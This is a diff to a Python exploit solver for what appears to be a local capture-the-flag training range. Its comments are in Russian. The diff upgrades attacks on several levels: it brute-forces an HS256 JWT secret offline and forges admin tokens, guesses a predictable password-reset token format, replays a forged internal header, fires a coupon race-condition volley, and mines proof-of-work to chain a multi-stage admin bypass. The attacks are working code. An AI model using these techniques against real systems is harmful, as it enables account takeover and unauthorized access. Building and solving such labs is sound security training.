@@ -31,6 +31,7 @@ BASE = os.environ.get("AB_URL", "http://127.0.0.1:8100")
 FLAG_RE = re.compile(r"FLAG-(\d+)-[0-9a-f]+")
 ROOMFLAG_RE = re.compile(r"ROOMFLAG-[0-9a-f]+")
 COOKIE = {}
+RESP_HEADERS = {}
 SALT = None          # кэш соли из portal.js (уровни 4, 5, 10)
 JWT_SECRET = None    # кэш секрета api v2 (уровни 7, 10)
 
@@ -51,7 +52,9 @@ def req(path, data=None, headers=None, form=None):
     r = urllib.request.Request(BASE + path, data=body,
                                method="POST" if body is not None else "GET", headers=hdrs)
     try:
-        resp = urllib.request.urlopen(r, timeout=60)
+        resp = urllib.request.urlopen(r, timeout=120)
+        global RESP_HEADERS
+        RESP_HEADERS = dict(resp.headers.items())
         sc = resp.headers.get("Set-Cookie") or ""
         for part in sc.split(";"):
             if part.strip().startswith("psid="):
@@ -70,6 +73,10 @@ def sha256(s):
 
 def md5(s):
     return hashlib.md5(s.encode()).hexdigest()
+
+
+def internal_headers():
+    return {"X-Omega-Internal": md5(get_salt() + "internal")}
 
 
 def get_salt():
@@ -92,8 +99,8 @@ def x1_sqli_admin():
 
 
 def x2_idor():
-    """Уровень 2: uid guardian не последовательный — вытаскиваем из ops-консоли."""
-    _, ops = req("/ops")
+    """Уровень 2 (ULTRA): ops за внутренним заголовком; uid оттуда."""
+    _, ops = req("/ops", headers=internal_headers())
     uid = re.search(r"guardian: создан uid=(\d+)", ops).group(1)
     _, prof = req("/profile?id=" + uid)
     m = FLAG_RE.search(prof)
@@ -113,15 +120,34 @@ def x3_traversal():
 
 
 def x4_predictable_token():
-    """Уровень 4: sha256(SALT-логин-ДАТА_UTC). формат и тест-вектор — в ops."""
+    """Уровень 4 (ULTRA): в ops есть только контрольный вектор demo без формата.
+    Перебираем кандидатов формата офлайн, пока не совпадёт с вектором."""
     salt = get_salt()
-    _, ops = req("/ops")
-    vector = re.search(r"reset\(demo\):[^=]+= ([0-9a-f]{64})", ops).group(1)
-    day = time.strftime("%Y-%m-%d", time.gmtime())
-    # проверяем догадку о формате на тест-векторе demo
-    assert sha256("%s-demo-%s" % (salt, day)) == vector, \
-        "формат токена угадан неверно (вектор не сошёлся)"
-    token = sha256("%s-guardian-%s" % (salt, day))
+    _, ops = req("/ops", headers=internal_headers())
+    vector = re.search(r"контрольный вектор = ([0-9a-f]{64})", ops).group(1)
+    day_dash = time.strftime("%Y-%m-%d", time.gmtime())
+    day_compact = time.strftime("%Y%m%d", time.gmtime())
+    candidates = []
+    for d in (day_dash, day_compact):
+        candidates += [
+            lambda l, d=d: "%s-%s-%s" % (salt, l, d),
+            lambda l, d=d: "%s%s%s" % (salt, l, d),
+            lambda l, d=d: "%s_%s_%s" % (salt, l, d),
+            lambda l, d=d: "%s:%s:%s" % (salt, l, d),
+            lambda l, d=d: "%s+%s+%s" % (salt, l, d),
+            lambda l, d=d: "%s-%s" % (l, d) + salt,
+            lambda l, d=d: d + salt + l,
+        ]
+    fmt = None
+    for c in candidates:
+        try:
+            if sha256(c("demo")) == vector:
+                fmt = c
+                break
+        except Exception:
+            continue
+    assert fmt, "формат токена не подобран по вектору"
+    token = sha256(fmt("guardian"))
     _, body = req("/reset?user=guardian&token=" + token)
     m = re.search(r"FLAG-4-[0-9a-f]+", body)
     assert m, "токен не принят: %s" % body[:200]
@@ -154,7 +180,7 @@ def x6_cmd_injection():
 
 
 def _brute_jwt(h, p, sig):
-    """Брутфорс секрета HS256: 4 символа [a-z0-9] = 1.68M, в 8 потоков."""
+    """Брутфорс секрета HS256: 5 символов [a-z0-9] = 52M, в 8 потоков (офлайн)."""
     charset = "abcdefghijkmnopqrstuvwxyz0123456789"
     msg = ("%s.%s" % (h, p)).encode()
     target = sig.lower()
@@ -163,7 +189,7 @@ def _brute_jwt(h, p, sig):
 
     def worker(prefixes):
         for pre in prefixes:
-            for rest in itertools.product(charset, repeat=3):
+            for rest in itertools.product(charset, repeat=4):
                 cand = pre + "".join(rest)
                 if hmac.compare_digest(hmac.new(cand.encode(), msg, hashlib.sha256).hexdigest(), target):
                     with lock:
@@ -246,20 +272,21 @@ def x8_blind_sqli():
 
 def x9_race():
     """Уровень 9: пять промокодов из ops, залп потоками на каждое окно гонки."""
-    _, ops = req("/ops")
-    codes = re.findall(r"OMEGA-25-[0-9A-F]{4}", ops)
-    assert len(codes) == 5, "не нашёл 5 промокодов: %s" % ops[:300]
+    _, ops = req("/ops", headers=internal_headers())
+    codes = re.findall(r"OMEGA-20-[0-9A-F]{4}", ops)
+    assert len(codes) == 6, "не нашёл 6 промокодов: %s" % ops[:300]
 
     def fire(code):
         req("/wallet/coupon?code=" + code)
 
-    for code in codes:
-        ts = [threading.Thread(target=fire, args=(code,)) for _ in range(12)]
-        [t.start() for t in ts]
-        [t.join() for t in ts]
+    for volley in range(30):
+        for code in codes:
+            ts = [threading.Thread(target=fire, args=(code,)) for _ in range(30)]
+            [t.start() for t in ts]
+            [t.join() for t in ts]
         _, wallet = req("/wallet")
         bal = int(re.search(r"баланс: <b>(\d+)</b>", wallet).group(1))
-        if bal >= 500:
+        if bal >= 1000:
             break
     _, body = req("/wallet/buy?item=premium")
     m = re.search(r"FLAG-9-[0-9a-f]+", body)
@@ -267,14 +294,26 @@ def x9_race():
     return m.group(0)
 
 
+def _mine_pow(token, prefix="00000"):
+    """ULTRA-ядро: ищем nonce, чтобы sha256(token+nonce) начинался с prefix."""
+    import struct
+    n = 0
+    t0 = time.time()
+    base = token.encode()
+    while True:
+        nonce = str(n)
+        if hashlib.sha256(base + nonce.encode()).hexdigest().startswith(prefix):
+            return nonce
+        n += 1
+        if n % 200000 == 0 and time.time() - t0 > 120:
+            raise RuntimeError("PoW не майнится за 120с")
+
+
 def x10_nightmare():
-    """Уровень 10: четыре рубежа одним запросом, всё вычисляется офлайн.
-    1) админ-сессия (SQLi)  2) X-Omega-Internal = md5(SALT+'internal')
-    3) PIN = sha256('admin'+SALT+ЧАС_UTC)[:4]  4) свежий Bearer svc-internal."""
+    """ULTRA-ЯДРО: PoW + 4 рубежа. 1) админ-сессия 2) X-Omega-Internal
+    3) PIN = sha256('omega-'+SALT+'-'+МинУТA_UTC)[:6] 4) свежий Bearer svc-internal."""
     salt = get_salt()
     assert JWT_SECRET, "нужен секрет JWT с уровня 7"
-    hour = time.gmtime().tm_hour
-    pin = sha256("admin" + salt + "%02d" % hour)[:4]
 
     def b64u(o):
         return base64.urlsafe_b64encode(json.dumps(o).encode()).decode().rstrip("=")
@@ -282,12 +321,29 @@ def x10_nightmare():
     fh, fp = b64u({"alg": "HS256", "typ": "JWT"}), \
         b64u({"user": "svc-internal", "role": "admin", "iat": int(time.time())})
     fs = hmac.new(JWT_SECRET.encode(), ("%s.%s" % (fh, fp)).encode(), hashlib.sha256).hexdigest()
-    _, body = req("/admin/panel?pin=" + pin, headers={
+    base_headers = {
         "X-Omega-Internal": md5(salt + "internal"),
         "Authorization": "Bearer %s.%s.%s" % (fh, fp, fs),
-    })
+    }
+
+    # рубеж 5: получить PoW-токен и решить его
+    minute = time.strftime("%Y%m%d%H%M", time.gmtime())
+    minute_prev = time.strftime("%Y%m%d%H%M", time.gmtime(time.time() - 60))
+    pin = sha256("omega-%s-%s" % (salt, minute))[:6]
+    pin_prev = sha256("omega-%s-%s" % (salt, minute_prev))[:6]
+    h = dict(base_headers)
+    _, body = req("/admin/panel?pin=" + pin, headers=h)
+    token = RESP_HEADERS.get("X-PoW-Token")
+    if token:
+        nonce = _mine_pow(token)
+        h.update({"X-PoW-Token": token, "X-PoW-Nonce": nonce})
+        _, body = req("/admin/panel?pin=" + pin, headers=h)
     m = re.search(r"FLAG-10-[0-9a-f]+", body)
-    assert m, "цепочка не сошлась: %s" % body[:400]
+    if not m and pin != pin_prev:  # смена минуты на границе
+        h2 = dict(h)
+        _, body = req("/admin/panel?pin=" + pin_prev, headers=h2)
+        m = re.search(r"FLAG-10-[0-9a-f]+", body)
+    assert m, "ядро не пало: %s" % body[:400]
     return m.group(0)
 
 
